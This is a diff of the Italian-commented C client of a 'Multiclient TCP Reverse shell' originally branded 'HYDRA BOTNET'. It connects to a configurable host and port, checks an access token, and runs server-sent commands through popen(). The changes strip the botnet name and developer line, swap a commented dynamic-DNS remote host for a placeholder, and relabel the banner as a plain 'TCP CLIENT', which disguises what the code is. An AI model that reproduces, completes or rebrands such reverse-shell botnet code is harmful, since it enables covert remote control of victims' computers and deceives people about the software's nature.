@@ -1,11 +1,11 @@
 /*
 	*	*	*	*	*	*	*	*	*	*	*	*	*
 	*	*	*	*	*	*	*	*	*	*	*	*	*
-	*   H   Y   D   R   A   B   O   T   N   E   T   *
+	*	*	*	*	*	*	*
 	*   * Multiclient TCP Reverse shell 1.0.3.1 *   *
 	*	*	*	*	*	*	*	*	*	*	*	*	*
 	*   Scritto in C & test eseguiti Dev-C 5.11 *   *
-	*   *  sviluppatore: ************ Lug.2023  *   *
+	*	*	*	*	*	*	*
 	*   *   *   *   *   *   *   *   *   *   *   *   *
 	*	*	*	*	*	*	*	*	*	*	*	*	*
 	*   *   *   *  < Client-side >	*	*	*	*	*	
@@ -53,7 +53,7 @@ int main(int argc , char *argv[])
 	// * * * * * * * * * * * * * * *
 	// HOSTNAME or IP ADDR. AND PORT CONFIGS.
 	char *host_name = "127.0.0.1";
-	//char *host_name = "testnetwork409-62731.portmap.host";
+	//char *host_name = "test123456789.nomedominio.host";
 	int port = 8888;
 	// * * * * * * * * * * * * * * *
 	// * * * * * * * * * * * * * * *
@@ -92,7 +92,7 @@ int main(int argc , char *argv[])
 	bool connected = false;
 
 	// Manifesto
-	printf("\tH Y D R A B O T N E T\n\t* Client: Rel.1.0.3.1 - 02/08/2023\n\t* Autore: **** *** (***)\n");
+	printf("\tTCP CLIENT\n\t* Client: Rel.1.0.3.1 - 02/08/2023\n\t* Autore: Malcolm Mami *\n");
 	
 	// Inizializzazione libreria winsock
 	printf("\n > Inizializzazione winsock -->");
@@ -233,7 +233,7 @@ int main(int argc , char *argv[])
 					server_reply[recv_size] = '\0';
 					//printf("\n + [RISPOSTA DAL SERVER]-->%s", server_reply);
 					
-					// Controllo se il token di accesso Ë corretto
+					// Controllo se il token di accesso √® corretto
 					if (strcmp(server_reply, AUTH_TOKEN) == 0)
 					{
 						//Ottengo la directory di lavoro
@@ -407,7 +407,7 @@ int main(int argc , char *argv[])
 								}
 								else
 								{
-									// apro un pipe in modalit‡ (lettura) sul processo voluto dal comando ricevuto sopra
+									// apro un pipe in modalit√† (lettura) sul processo voluto dal comando ricevuto sopra
 									if ((fp = popen(stdin_command, "r")) == NULL)
 									{
 										// Nel caso di errore in apertura della pipe
